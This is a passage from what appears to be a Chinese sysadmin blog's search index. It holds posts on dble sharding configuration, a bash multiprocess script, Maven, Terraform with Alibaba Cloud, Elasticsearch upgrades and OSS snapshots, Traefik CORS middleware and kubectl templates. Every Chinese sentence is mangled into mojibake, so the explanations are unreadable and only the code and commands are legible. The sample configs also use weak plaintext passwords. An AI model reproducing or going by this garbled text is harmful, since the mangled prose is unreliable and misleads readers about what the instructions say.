å®šä¹‰åˆ†ç‰‡å­è¡¨,å¤–é¢å’Œåˆ†ç‰‡è¡¨ä¸€æ · --\u003e \u003ctable name=\"customer\" primaryKey=\"ID\" dataNode=\"dn1,dn2\" rule=\"sharding-by-mod\"\u003e \u003c!-- å®šä¹‰åˆ†ç‰‡å­è¡¨ç±»å‹,åˆ†åˆ«å¯¹åº”è¡¨åã€ä¸»é”®åˆ—ã€å­è¡¨ä¸­çš„idã€çˆ¶è¡¨ä¸­çš„id --\u003e \u003cchildTable name=\"orders\" primaryKey=\"ID\" joinKey=\"customer_id\" parentKey=\"id\" /\u003e \u003c!-- æ‰¾åˆ°çˆ¶è¡¨ä¸­idåˆ—ç­‰äºå­è¡¨ä¸­çš„customer_idåˆ—çš„è®°å½•ï¼Œè¢«åˆ†ç‰‡åˆ°å“ªä¸ªèŠ‚ç‚¹ä¸­ã€‚å­è¡¨çš„æ•°æ®ä¹Ÿä¼šè¢«åˆ†é…åˆ°å’Œçˆ¶è¡¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸­ --\u003e \u003c/table\u003e \u003c!-- éåˆ†ç‰‡è¡¨ç±»å‹ --\u003e \u003ctable name=\"logs\" dataNode=\"dn2\" /\u003e \u003c/schema\u003e ** dataNodeã€dataHostéƒ¨åˆ† ** \u003c!-- å®šä¹‰mysqlèŠ‚ç‚¹åç§°ã€mysqlçš„è¿æ¥ä¿¡æ¯(dataHost)ã€mysqlçš„database --\u003e \u003cdataNode name=\"dn1\" dataHost=\"dh1\" database=\"db1\" /\u003e \u003cdataNode name=\"dn2\" dataHost=\"dh1\" database=\"db2\" /\u003e \u003c!-- å®šä¹‰æ•°æ®åº“è¿æ¥ä¿¡æ¯åç§° --\u003e \u003cdataHost name=\"dh1\" maxCon=\"1000\" minCon=\"10\" balance=\"0\" switchType=\"-1\" slaveThreshold=\"100\"\u003e \u003c!-- dbleç”¨æ¥æ£€æµ‹æ•°æ®åº“æ˜¯å¦å¯ä»¥è¿æ¥çš„sqlå‘½ä»¤ --\u003e \u003cheartbeat\u003eshow slave status\u003c/heartbeat\u003e \u003c!-- åç«¯mysqlçš„å…·ä½“è¿æ¥ä¿¡æ¯,æ”¯æŒè¯»å†™åˆ†ç¦» --\u003e \u003cwriteHost host=\"hostM1\" url=\"127.0.0.1:3306\" user=\"root\" password=\"123456\" \u003e \u003creadHost host=\"hostS1\" url=\"127.0.0.1:3307\" user=\"root\" password=\"1234567\" \u003e \u003c/writeHost\u003e \u003c/dataHost\u003e å‚æ•°å…·ä½“å«ä¹‰: https://actiontech.github.io/dble-docs-cn/history/2.19.03.0/1.config_file/1.02_schema.xml.html ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:1","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"rule.xml åˆ†ç‰‡å…·ä½“ä½¿ç”¨çš„è§„åˆ™ã€åˆ†ç‰‡æ•°é‡ã€åˆ†ç‰‡ç»†èŠ‚ é…ç½®è¯­æ³•æ ¼å¼: \u003ctableRule name=\"id-enum\"\u003e \u003c!-- åˆ†ç‰‡è§„åˆ™åç§° --\u003e \u003crule\u003e \u003ccolumns\u003eid\u003c/columns\u003e \u003c!-- åˆ†ç‰‡åˆ— --\u003e \u003calgorithm\u003eenum\u003c/algorithm\u003e \u003c!-- æŒ‡å®šåˆ†ç‰‡æ–¹æ³•å,å¯¹åº”ä¸‹é¢çš„functionåç§° --\u003e \u003c/rule\u003e \u003c/tableRule\u003e \u003cfunction name=\"enum\" class=\"Enum\"\u003e \u003c!-- åˆ†ç‰‡æ–¹æ³•åå’Œç±»å(ç±»ååªèƒ½æ˜¯Enum,NumberRange,Hash,StringHash,Date,PatternRange,jumpStringHash) --\u003e \u003cproperty name=\"mapFile\"\u003epartition-hash-int.txt\u003c/property\u003e \u003cproperty name=\"defaultNode\"\u003e0\u003c/property\u003e \u003cproperty name=\"type\"\u003e0\u003c/property\u003e \u003c/function\u003e functionå¯ä»¥å†™ä¸€ä¸ªåˆ†ç‰‡ç»†èŠ‚ï¼ŒtableRuleç”¨æ¥å¼•ç”¨è¿™ä¸ªåˆ†ç‰‡ç»†èŠ‚ã€‚ æ¯”å¦‚coustomerè¦æŒ‰ç…§idåˆ†ç‰‡ï¼Œorderè¦æŒ‰ç…§cidæ¥åˆ†ç‰‡ã€‚ä»–ä»¬çš„åˆ†ç‰‡é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆä»–ä»¬å¯ä»¥æŒ‡å‘åŒä¸€ä¸ªfunctionã€‚ ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:2","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"wrapper.conf jvmé…ç½®ç›¸å…³ ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:3","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"myid.properites dbleé›†ç¾¤é…ç½®,æš‚æœªäº†è§£ ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:4","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" #!/bin/bash function init(){ [ -e fd1 ] || mkfifo fd1 exec 5\u003c\u003efd1 rm -f fd1 NUM=${1:-10} for (( i=1;i\u003c=${NUM};i++ )) do echo \u003e\u00265 done } function start(){ while true; do [ -f lock ] \u0026\u0026 break read -u5 { #script body echo \u003e\u00265 } \u0026 sleep ${1:-0} done wait } # åˆå§‹åŒ–,æŒ‡å®šè¿›ç¨‹æ•° init $1 # å¼€å§‹æ‰§è¡Œ,å¦‚æœè¦åŠ æ‰§è¡Œé—´éš”å¯ä»¥æŒ‡å®š start $2 ","date":"2022-04-28 22:52","objectID":"/post/2827/:0:0","tags":["linux","shell"],"title":"shellè„šæœ¬å®ç°å¤šè¿›ç¨‹","uri":"/post/2827/"},{"categories":["java"],"content":"ä½¿ç”¨mavenç¼–è¯‘çš„æ—¶å€™æŠ¥é”™Exception in thread \"main\" java.lang.AssertionErrorï¼Œéœ€è¦æ·»åŠ ä¸€ä¸ªç¼–è¯‘æ’ä»¶æ˜¾ç¤ºè¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e \u003cversion\u003e3.8.1\u003c/version\u003e \u003cconfiguration\u003e \u003cforceJavacCompilerUse\u003etrue\u003c/forceJavacCompilerUse\u003e \u003c/configuration\u003e \u003c/plugin\u003e ","date":"2022-04-26 20:46","objectID":"/post/2826/:0:0","tags":["java","maven"],"title":"java Exception in thread main java.lang.AssertionError","uri":"/post/2826/"},{"categories":["äº‘åŸç”Ÿ","terraform"],"content":"Providers: æä¾›ä¸ä¸åŒäº‘å‚å•†çš„äº¤äº’ æ”¯æŒçš„Providers: https://registry.terraform.io/browse/providers ","date":"2022-04-23 04:02","objectID":"/post/2818/:0:0","tags":["terraform"],"title":"terraformå­¦ä¹ (ä¸€)","uri":"/post/2818/"},{"categories":["äº‘åŸç”Ÿ","terraform"],"content":"åˆä½“éªŒ ç›®å½•ç»“æ„å¦‚ä¸‹ 03887-ldcedko4p3.png ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:0","tags":["terraform"],"title":"terraformå­¦ä¹ (ä¸€)","uri":"/post/2818/"},{"categories":["äº‘åŸç”Ÿ","terraform"],"content":"ä¸€ã€å£°æ˜Provider è¿™é‡Œä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ # file: versions.tf terraform { # æŒ‡å®šterraformçš„ç‰ˆæœ¬å· required_version = \"1.1.9\" # å£°æ˜æˆ‘ä»¬è¦ç”¨çš„peovideråˆ—è¡¨,è¿™é‡Œçš„å†…å®¹å¯ä»¥é€šè¿‡å®˜æ–¹æ–‡æ¡£è·å– required_providers { alicloud = { source = \"aliyun/alicloud\" version = \"1.164.0\" } } } required_versionå¯ä»¥é€šè¿‡terraform versionæŸ¥çœ‹,æ³¨æ„ç‰ˆæœ¬å·ä¸å¸¦v ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:1","tags":["terraform"],"title":"terraformå­¦ä¹ (ä¸€)","uri":"/post/2818/"},{"categories":["äº‘åŸç”Ÿ","terraform"],"content":"äºŒã€é…ç½®Provider ä¸Šé¢æˆ‘ä»¬å£°æ˜äº†æˆ‘ä»¬è¦ä½¿ç”¨é˜¿é‡Œäº‘,ä¸‹é¢éœ€è¦é…ç½®é˜¿é‡Œäº‘è®¤è¯çš„ç›¸å…³å‚æ•° # file: main.tf provider \"alicloud\" { access_key = \"${var.ali_access_key}\" secret_key = \"${var.ali_secret_key}\" region = \"${var.ali_region}\" } æˆ‘ä»¬é€šè¿‡ç¯å¢ƒå˜é‡æ¥è¯»å–æ‰€éœ€è¦çš„ä¿¡æ¯,ç¯å¢ƒå˜é‡éœ€è¦ä»¥TF_VAR_å¼€å¤´ ä¾‹å¦‚: TF_VAR_ali_access_key=xxxã€TF_VAR_ali_secret_key=xxxã€TF_VAR_ali_region=xxx å£°æ˜å˜é‡ç±»å‹ # variables.tf variable \"ali_access_key\" { type = string } variable \"ali_secret_key\" { type = string } variable \"ali_region\" { type = string } ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:2","tags":["terraform"],"title":"terraformå­¦ä¹ (ä¸€)","uri":"/post/2818/"},{"categories":["äº‘åŸç”Ÿ","terraform"],"content":"ä¸‰ã€å£°æ˜èµ„æº è¿™é‡ŒæŒ‡å®šæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªVPCç½‘ç»œ,å¹¶ä¸”è¿˜ä¼šåˆ›å»ºä¸€ä¸ªäº¤æ¢æœº # file: ali_vpc.tf # å®šä¹‰ä¸€ä¸ªèµ„æº # æ ¼å¼ resource \"èµ„æºç±»å‹\" \"èµ„æºåç§°\" resource \"alicloud_vpc\" \"vpc\" { vpc_name = \"tf_test_foo\" cidr_block = \"172.16.0.0/12\" } # äº¤æ¢æœºå±äºvpc,æ‰€ä»¥å¯ä»¥é¡ºå¸¦åˆ›å»ºäº† resource \"alicloud_vswitch\" \"vsw\" { # å¼•ç”¨ä¸Šé¢çš„vpcèµ„æº,é€šè¿‡`èµ„æºç±»å‹.èµ„æºåç§°.id`è·å– vpc_id = alicloud_vpc.vpc.id vswitch_name = \"tf_test_foo-a\" cidr_block = \"172.16.0.0/24\" zone_id = \"cn-shanghai-a\" } ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:3","tags":["terraform"],"title":"terraformå­¦ä¹ (ä¸€)","uri":"/post/2818/"},{"categories":["äº‘åŸç”Ÿ","terraform"],"content":"å››ã€åˆå§‹åŒ–terraform cd tf-example terraform init initå«ä¹‰: Terraform ä½¿ç”¨tf-exampleä½œä¸ºå·¥ä½œç›®å½•ï¼Œå¹¶ä¸”è¿˜ä¼šåˆ›å»º.terraformç›®å½•æ¥å­˜å‚¨è®¾ç½®ä¿¡æ¯ã€ç¼“å­˜æ’ä»¶å’Œæ¨¡å—ï¼ŒçŠ¶æ€æ•°æ®ã€‚ ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:4","tags":["terraform"],"title":"terraformå­¦ä¹ (ä¸€)","uri":"/post/2818/"},{"categories":["äº‘åŸç”Ÿ","terraform"],"content":"äº”ã€æ£€æŸ¥è®¡åˆ’ æ£€æŸ¥è®¡åˆ’ç”¨æ¥æ£€æŸ¥æˆ‘ä»¬çš„é…ç½®,å¹¶ä¸ä¼šçœŸæ­£çš„åˆ›å»ºèµ„æº terraform plan å¯ä»¥çœ‹åˆ°æç¤ºæˆ‘ä»¬æœ‰ä¸¤ä¸ªæ–°å¢ 31336-y4hqq014v2.png ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:5","tags":["terraform"],"title":"terraformå­¦ä¹ (ä¸€)","uri":"/post/2818/"},{"categories":["äº‘åŸç”Ÿ","terraform"],"content":"å…­ã€åˆ›å»ºèµ„æº terraform apply å¯ä»¥çœ‹åˆ°vpcå’Œäº¤æ¢æœºéƒ½æˆåŠŸåˆ›å»ºäº† 17300-s0bdlth6xec.png ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:6","tags":["terraform"],"title":"terraformå­¦ä¹ (ä¸€)","uri":"/post/2818/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"1.ç¦ç”¨åˆ†ç‰‡è‡ªåŠ¨åˆ†é… PUT _cluster/settings { \"persistent\": { \"cluster.routing.allocation.enable\": \"none\" } } ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:1","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"2.æ‰§è¡ŒåŒæ­¥åˆ·æ–° å¯ä»¥æå‡æ¢å¤é€Ÿåº¦https://www.kancloud.cn/apachecn/elasticsearch-doc-zh/1945139 POST _flush/synced ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:2","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"3.å…³é—­æ‰€æœ‰èŠ‚ç‚¹çš„esæˆ–è€…ä¸€å°ä¸€å°å‡çº§éƒ½å¯ä»¥ ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:3","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"4.å‡çº§ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.3.rpm rpm -U elasticsearch-5.5.3.rpm ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:4","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"5.å‡çº§æ’ä»¶ - å¦‚æœéœ€è¦çš„è¯ ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:5","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"6.å¯åŠ¨èŠ‚ç‚¹ å¦‚æœé…ç½®äº†masterå’Œnodeï¼Œéœ€è¦ä¼˜å…ˆå¯åŠ¨master systemctl start elasticsearch ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:6","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"7.è§‚å¯Ÿé›†ç¾¤çŠ¶æ€ å¯ä»¥çœ‹åˆ°é›†ç¾¤å¤„äºé»„è‰²çŠ¶æ€,è¿™æ˜¯å› ä¸ºå‰¯æœ¬åˆ†ç‰‡æ²¡æœ‰è¢«åˆ†é… GET _cat/health GET _cat/nodes ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:7","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"8.é‡æ–°å¯ç”¨åˆ†ç‰‡è‡ªåŠ¨åˆ†é… PUT _cluster/settings { \"persistent\": { \"cluster.routing.allocation.enable\": \"all\" } } ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:8","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["åŸºç¡€å†…å®¹","databases"],"content":"9.ç­‰å¾…æ¢å¤å®Œæˆ # æŸ¥çœ‹é›†ç¾¤å¥åº·çŠ¶æ€ GET _cat/health # æŸ¥çœ‹æ¢å¤è¿›åº¦ GET _cat/recovery ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:9","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1å°ç‰ˆæœ¬å‡çº§åˆ°5.5.3","uri":"/post/2814/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å®‰è£…æ’ä»¶ æ’ä»¶å®˜æ–¹æ–‡æ¡£ ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:0","tags":["elasticsearch"],"title":"Elasticsearchå¿«ç…§åˆ°é˜¿é‡Œäº‘OSS","uri":"/post/2813/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ä¸€ã€å‡†å¤‡å·¥ä½œ ä¸€ä¸ªoss bucket é˜¿é‡Œäº‘çš„access_key_id,secret_access_key ä¸€ä¸ªes5.xçš„é›†ç¾¤ ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:1","tags":["elasticsearch"],"title":"Elasticsearchå¿«ç…§åˆ°é˜¿é‡Œäº‘OSS","uri":"/post/2813/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"äºŒã€å®‰è£…elasticsearch-repository-ossæ’ä»¶ ä¸‹è½½æ’ä»¶ wget https://github.91chi.fun/https://github.com/aliyun/elasticsearch-repository-oss/releases/download/v5.5.3/elasticsearch-repository-oss-5.5.3.zip ansible-playbookæ‰¹é‡å®‰è£…æ’ä»¶ - hosts: es vars: plugin_dir: /usr/share/elasticsearch/plugins plugin_file: ./elasticsearch-repository-oss-5.5.3.zip tasks: - name: install aliyun-oss-plugin unarchive: src: \"{{ plugin_file }}\" dest: \"{{ plugin_dir }}\" mode: 0755 - name: alter directory name shell: \"mv {{plugin_dir}}/elasticsearch {{plugin_dir}}/elasticsearch-repository-oss\" # é‡å¯è¯·è°¨æ… #- name: restart elasticsearch # service: name=elasticsearch state=restarted ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:2","tags":["elasticsearch"],"title":"Elasticsearchå¿«ç…§åˆ°é˜¿é‡Œäº‘OSS","uri":"/post/2813/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ä¸‰ã€åˆ›å»ºrepositories repoName: ä»“åº“åç§° yourAccesskeyId: é˜¿é‡Œak yourAccesskeySecret: é˜¿é‡Œsk yourBucketName: bucketåç§° endpoint: æ ¹æ®è‡ªå·±bucketçš„æƒ…å†µä¿®æ”¹ base_path: å¯¹åº”ossä¸­çš„å­è·¯å¾„ curl -H \"Content-Type: application/json\" -XPUT localhost:9200/_snapshot/\u003crepoName\u003e -d \\ '{ \"type\": \"oss\", \"settings\": { \"endpoint\": \"http://oss-cn-hangzhou-internal.aliyuncs.com\", \"access_key_id\": \"\u003cyourAccesskeyId\u003e\", \"secret_access_key\": \"\u003cyourAccesskeySecret\u003e\", \"bucket\": \"\u003cyourBucketName\u003e\", \"compress\": true, \"base_path\": \"snapshot/\" } }' æŸ¥çœ‹ä»“åº“ curl http://localhost:9200/_cat/repositories ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:3","tags":["elasticsearch"],"title":"Elasticsearchå¿«ç…§åˆ°é˜¿é‡Œäº‘OSS","uri":"/post/2813/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"å››ã€åˆ›å»ºsnapshot snapshotName: å¿«ç…§å curl -H \"Content-Type: application/json\" -XPUT localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e?pretty -d' { \"indices\": \"index1,index2\" }' å¦‚æœè¦å¤‡ä»½æ‰€æœ‰ç´¢å¼•æ‰§è¡Œ: curl -XPUT localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e æŸ¥çœ‹å¿«ç…§è¿›åº¦: curl -s http://localhost:9200/_snapshot/\u003crepoName\u003e/_all ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:4","tags":["elasticsearch"],"title":"Elasticsearchå¿«ç…§åˆ°é˜¿é‡Œäº‘OSS","uri":"/post/2813/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"æ¢å¤å¿«ç…§ ","date":"2022-04-22 10:10","objectID":"/post/2813/:2:0","tags":["elasticsearch"],"title":"Elasticsearchå¿«ç…§åˆ°é˜¿é‡Œäº‘OSS","uri":"/post/2813/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ä¸€ã€ä¸‰ç§æ¢å¤ç´¢å¼•çš„æ–¹å¼ 1.æ¢å¤æ‰€æœ‰ç´¢å¼• curl -XPOST localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e/_restore # é»˜è®¤åå°æ‰§è¡Œæ¢å¤,é˜»å¡æ‰§è¡Œæ¢å¤å¯ä»¥ä½¿ç”¨ curl -XPOST localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e/_restore?wait_for_completion=true 2.é€‰æ‹©æ€§ç´¢å¼•æ¢å¤ *ä»£è¡¨æ¢å¤æ‰€æœ‰ç´¢å¼• -xxx*ä»£è¡¨ä¸æ¢å¤å“ªäº›ç´¢å¼• curl -XPOST localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e/_restore {\"indices\":\"*,-.monitoring*,-.security_audit*\",\"ignore_unavailable\":\"true\"} 3.ä¿®æ”¹ç´¢å¼•åæ¢å¤ å¦‚æœé›†ç¾¤ä¸­å·²ç»å­˜åœ¨ç›¸åŒç´¢å¼•åçš„ç´¢å¼•,ä¸ºäº†ä¸å½±å“ç°æœ‰æ•°æ®,å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼é‡å‘½åç´¢å¼•ã€‚ è¿™é‡Œåº”è¯¥ä¹Ÿå¯ä»¥åœ¨ç´¢å¼•æ¢å¤è¿‡ç¨‹ä¸­,ä¿®æ”¹ç´¢å¼•åç§°, curl -XPOST localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e/_restore { \"indices\":\"index1\", \"rename_pattern\": \"index(.+)\", \"rename_replacement\": \"restored_index_$1\" } indices: è¦æ¢å¤çš„ç´¢å¼•åç§° rename_pattern: é€šè¿‡æ­£åˆ™æŸ¥æ‰¾æ­£åœ¨æ¢å¤çš„ç´¢å¼• rename_replacement: é‡å‘½åæŸ¥æ‰¾åˆ°çš„ç´¢å¼• ","date":"2022-04-22 10:10","objectID":"/post/2813/:2:1","tags":["elasticsearch"],"title":"Elasticsearchå¿«ç…§åˆ°é˜¿é‡Œäº‘OSS","uri":"/post/2813/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"äºŒã€æŸ¥çœ‹æ¢å¤è¿›åº¦ # æŸ¥çœ‹æŒ‡å®šç´¢å¼•çš„æ¢å¤çŠ¶æ€ curl -XGET localhost:9200/\u003cindexName\u003e/_recovery # æŸ¥çœ‹æ‰€æœ‰ç´¢å¼•çš„æ¢å¤çŠ¶æ€ curl -XGET localhost:9200/_recovery/ ","date":"2022-04-22 10:10","objectID":"/post/2813/:2:2","tags":["elasticsearch"],"title":"Elasticsearchå¿«ç…§åˆ°é˜¿é‡Œäº‘OSS","uri":"/post/2813/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"1.è¿™é‡Œç”¨åˆ°traefikçš„middleware,ç”¨äºæ·»åŠ å“åº”å¤´ apiVersion: traefik.containo.us/v1alpha1 kind: Middleware metadata: name: test-cors namespace: default spec: headers: customResponseHeaders: Access-Control-Allow-Origin: \"http://soulchild.cn:8080\" Access-Control-Allow-Methods: \"*\" Access-Control-Allow-Headers: \"*\" # å¦ä¸€ç§å†™æ³• #accessControlAllowMethods: # - \"*\" #accessControlAllowOriginList: # - \"http://soulchild.cn:8080\" #accessControlAllowHeaders: # - \"*\" #accessControlMaxAge: 100 #addVaryHeader: true ","date":"2022-04-15 21:47","objectID":"/post/2810/:0:1","tags":["k8s","traefik"],"title":"traefiké…ç½®è·¨åŸŸç­–ç•¥","uri":"/post/2810/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"2.å’Œè·¯ç”±å…³è” è¿™é‡Œè¯´ä¸¤ç§,ä¸€ç§æ˜¯ingressèµ„æºï¼Œå¦ä¸€ç§æ˜¯ingressroute åœ¨ingressä¸­æ·»åŠ annotationså°±å¯ä»¥å…³è”äº† traefik.ingress.kubernetes.io/router.middlewares: default-test-cors@kubernetescrd å¦‚æœä½¿ç”¨çš„æ˜¯ingressroute spec: entryPoints: - web routes: - kind: Rule match: PathPrefix(`/api/xxx`) middlewares: - name: test-cors namespace: default ","date":"2022-04-15 21:47","objectID":"/post/2810/:0:2","tags":["k8s","traefik"],"title":"traefiké…ç½®è·¨åŸŸç­–ç•¥","uri":"/post/2810/"},{"categories":["java"],"content":"å’Œæ˜¯åŒçº§çš„,è¿™æ ·è®¾ç½®çš„å¥½å¤„å°±æ˜¯åœ¨æ„å»ºå®¹å™¨é•œåƒçš„æ—¶å€™ï¼Œæ‰€æœ‰é¡¹ç›®å¯ä»¥ç»Ÿä¸€ä½¿ç”¨ä¸€æ ·çš„åç§°ã€‚ \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-maven-plugin\u003c/artifactId\u003e \u003cconfiguration\u003e \u003cfork\u003etrue\u003c/fork\u003e \u003c!--\u003ejaråŒ…åç§°\u003c--\u003e \u003cfinalName\u003eapp\u003c/finalName\u003e \u003c!--\u003eå¯åŠ¨ç±»å…¨è·¯å¾„\u003c--\u003e \u003cmainClass\u003ecom.xxx.xx.xx.xx.xx.xxApplication\u003c/mainClass\u003e \u003c/configuration\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cgoals\u003e \u003cgoal\u003erepackage\u003c/goal\u003e \u003c/goals\u003e \u003c/execution\u003e \u003c/executions\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e ","date":"2022-04-15 21:39","objectID":"/post/2809/:0:0","tags":["maven"],"title":"mavenç¼–è¯‘è®¾ç½®jaråŒ…çš„åç§°","uri":"/post/2809/"},{"categories":["å…¶ä»–"],"content":"æ‰“å¼€å¼€å‘è€…å·¥å…·F12 var xhr = new XMLHttpRequest();xhr.open('GET', 'https://soulchild.cn');xhr.send(null); ","date":"2022-04-15 21:18","objectID":"/post/2808/:0:0","tags":[],"title":"è·¨åŸŸå¿«é€Ÿæµ‹è¯•","uri":"/post/2808/"},{"categories":["kubernetes"],"content":"å¤‡å¿˜ k get deploy -o template --template='{{range .items}}{{.metadata.name}}--replicas:{{.spec.replicas}}--{{range .spec.template.spec.containers}}cpu:{{.resources.limits.cpu}},mem:{{.resources.limits.memory}}{{end}}{{printf \"\\n\"}}{{end}}' ä½¿ç”¨indexå¤„ç†å¼•å·é—®é¢˜ k get ingress -A -o template --template='{{range .items}}{{.metadata.name}}--class:{{ index .metadata.annotations \"kubernetes.io/ingress.class\"}}{{printf \"\\n\"}}{{end}}' ","date":"2022-04-06 11:40","objectID":"/post/2807/:0:0","tags":["k8s"],"title":"k8s kubectl è‡ªå®šä¹‰è¾“å‡ºtemplate","uri":"/post/2807/"},{"categories":["databases"],"content":"ä»‹ç» pg_xlog è¿™ä¸ªæ—¥å¿—æ˜¯è®°å½•çš„Postgresqlçš„WALä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ä¸€äº›äº‹åŠ¡æ—¥å¿—ä¿¡æ¯(transaction log)ï¼Œé»˜è®¤å•ä¸ªå¤§å°æ˜¯16Mï¼Œæºç å®‰è£…çš„æ—¶å€™å¯ä»¥æ›´æ”¹å…¶å¤§å°ã€‚è¿™äº›ä¿¡æ¯é€šå¸¸åå­—æ˜¯ç±»ä¼¼'000000010000000000000013â€™è¿™æ ·çš„æ–‡ä»¶ï¼Œè¿™äº›æ—¥å¿—ä¼šåœ¨å®šæ—¶å›æ»šæ¢å¤(PITR)ï¼Œæµå¤åˆ¶(Replication Stream)ä»¥åŠå½’æ¡£æ—¶èƒ½è¢«ç”¨åˆ°ï¼Œè¿™äº›æ—¥å¿—æ˜¯éå¸¸é‡è¦çš„ï¼Œè®°å½•ç€æ•°æ®åº“å‘ç”Ÿçš„å„ç§äº‹åŠ¡ä¿¡æ¯ï¼Œä¸å¾—éšæ„åˆ é™¤æˆ–è€…ç§»åŠ¨è¿™ç±»æ—¥å¿—æ–‡ä»¶ï¼Œä¸ç„¶ä½ çš„æ•°æ®åº“ä¼šæœ‰æ— æ³•æ¢å¤çš„é£é™© å½“ä½ çš„å½’æ¡£æˆ–è€…æµå¤åˆ¶å‘ç”Ÿå¼‚å¸¸çš„æ—¶å€™ï¼Œäº‹åŠ¡æ—¥å¿—ä¼šä¸æ–­åœ°ç”Ÿæˆï¼Œæœ‰å¯èƒ½ä¼šé€ æˆä½ 